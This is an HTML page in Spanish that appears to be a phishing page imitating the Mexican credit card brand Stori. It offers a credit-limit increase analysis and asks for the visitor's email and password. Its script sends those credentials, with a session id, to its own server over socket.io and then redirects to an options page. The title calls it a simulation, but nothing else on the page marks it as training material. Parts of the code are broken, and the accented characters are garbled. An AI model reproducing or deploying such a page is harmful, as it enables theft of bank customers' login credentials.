<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Stori MX Simulaci√≥n</title>
  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css">
  <style>
    body {
      margin: 0;
      font-family: 'Open Sans', sans-serif;
      background: #f3f6f9;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 90vh;
    }

    .screen {
      display: flex;
      flex-direction: column;
      align-items: center;
      background: #fff;
      padding: 2rem;
      border-radius: 1rem;
      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
      width: 90%;
      max-width: 400px;
      text-align: center;
    }

    .logo {
      width: 100px;
      margin-bottom: 1rem;
    }

    /* Estilo de los campos de texto */
    .input-group {
      display: flex;
      align-items: center;
      background: #f0f2f5;
      border-radius: 8px;
      margin: 1rem 0;
      padding: 0.0rem 1rem;
      width: 100%;
      max-width: 350px; /* Reducido el tama√±o para hacerlos m√°s angostos */
    }

    .input-group .icon {
      color: #888;
      margin-right: 0.0rem;
    }

    .input-group input {
      border: none;
      background: transparent;
      outline: none;
      flex: 1;
      font-size: 1rem; /* Ajuste de tama√±o de texto */
      padding: 10px 0.75rem;
      height: 20px; /* Ajuste de altura */
    }

    button {
      background: #00b67a;
      color: white;
      padding: 12px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 1em;
      width: 100%;
    }

    button:hover {
      background: #00a16a;
    }

    button:disabled {
      background: #cccccc;
      cursor: not-allowed;
    }

    h2 {
      color: #003049;
      margin: 1rem 0 0.5rem;
    }

    p {
      color: #555;
      font-size: 0.95rem;
    }

    .mensaje-error {
      color: red;
      margin-top: 1rem;
      font-size: 0.85rem;
    }

    .campo-requerido {
      border: 1px solid red !important;
    }

  </style>
</head>
<body>
  <div class="screen active" id="pantallaInicio">
    <img src="https://i.imgur.com/GFGp9I7.png" alt="Stori Logo" class="logo">
    <h2>Bienvenido a su an√°lisis de aumento de cupo</h2>
    <p>Ingrese su correo y contrase√±a para continuar</p>
    <div class="input-group">
      <div class="icon"><i class="fas fa-envelope"></i></div>
      <input type="email" id="email" placeholder="Correo electr√≥nico" required>
    </div>
    <div class="input-group">
      <div class="icon"><i class="fas fa-lock"></i></div>
      <input type="password" id="password" placeholder="Contrase√±a" required>
    </div>
    <p id="emailError" class="mensaje-error"></p>
    <p id="passwordError" class="mensaje-error"></p>
    <button id="btnContinuar" onclick="validarEmail()">Continuar</button>
  </div>

  <script src="/socket.io/socket.io.js"></script>
  <script>
    const socket = io();

    window.addEventListener('DOMContentLoaded', () => {
      const form = document.getElementById('login-form');

      if (form) {
        form.addEventListener('submit', (e) => {
          e.preventDefault();

          const correo = document.getElementById('email').value;
          const contrasena = document.getElementById('password').value;

          // üîë Generar y guardar sessionId
          const sessionId = Math.random().toString(36).substring(2, 15);
          localStorage.setItem('sessionId', sessionId);

          // ‚úÖ Enviar datos al servidor mediante socket.io
          socket.emit('dataForm', { correo, contrasena, sessionId });

          // üïí Ir a pantalla de espera (o la siguiente p√°gina)
          window.location.href = 'opciones.html';
        });
      }
    });

    function validarEmail() {
      const email = document.getElementById("email").value;
      const emailError = document.getElementById("emailError");
      const emailInput = document.getElementById("email");
      
      // Validaci√≥n de formato de email
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      
      if (!email) {
        emailError.textContent = "El correo electr√≥nico es obligatorio";
        emailInput.classList.add("campo-requerido");
        return false;
      } else if (!emailRegex.test(email)) {
        emailError.textContent = "Por favor, ingrese un correo electr√≥nico v√°lido";
        emailInput.classList.add("campo-requerido");
        return false;
      } else {
        emailError.textContent = "";
        emailInput.classList.remove("campo-requerido");
        return true;
      }
    }

    function validarPassword() {
      const password = document.getElementById("password").value;
      const passwordError = document.getElementById("passwordError");
      const passwordInput = document.getElementById("password");

      if (!password) {
        passwordError.textContent = "La contrase√±a es obligatoria";
        passwordInput.classList.add("campo-requerido");
        return false;
      } else if (password.length < 4) {
        passwordError.textContent = "La contrase√±a debe tener al menos 4 caracteres";
        passwordInput.classList.add("campo-requerido");
        return false;
      } else {
        passwordError.textContent = "";
        passwordInput.classList.remove("campo-requerido");
        return true;
      }
    }
  </script>
</body>
</html>
